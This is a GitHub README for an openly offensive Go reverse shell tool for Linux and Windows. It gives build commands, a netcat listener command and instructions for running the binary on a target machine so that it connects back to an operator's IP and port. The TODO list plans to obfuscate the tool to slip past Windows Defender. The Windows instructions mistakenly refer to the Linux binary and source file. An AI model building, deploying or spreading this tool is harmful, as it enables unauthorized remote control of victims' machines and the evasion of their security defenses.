# GoRevShells
Basic reverse shell for linux and windows written in Go. Based off of @yougg's https://gist.github.com/yougg/b47f4910767a74fcfe1077d21568070e

## How to run (basic compilation; plenty of guides online on how to specify target operating system & architecture)
```
$ git clone https://github.com/NihilistPenguin/GoRevShells.git
$ cd GoRevshells
```
#### For linux:
```
$ cd linux
$ GOOS=linux go build linrev.go
```
Start netcat listener on host: `$ nc -nvlp PORT`<br>
On target machine: `$ ./linrev IP:PORT` or `$ ./linrev` (uses value set in *const default_host* of linrev.go file)

#### For windows:
```
$ cd windows
$ GOOS=windows go build winrev.go
```
Start netcat listener on host: `$ nc -nvlp PORT`<br>
On target machine: `$ .\winrev IP:PORT` or `$ .\linrev` (uses value set in *const default_host* of linrev.go file)


## TODO:
- add parameter for verbose output
- test it with obfuscator against Windows Defender
- other stuff I can't think of right now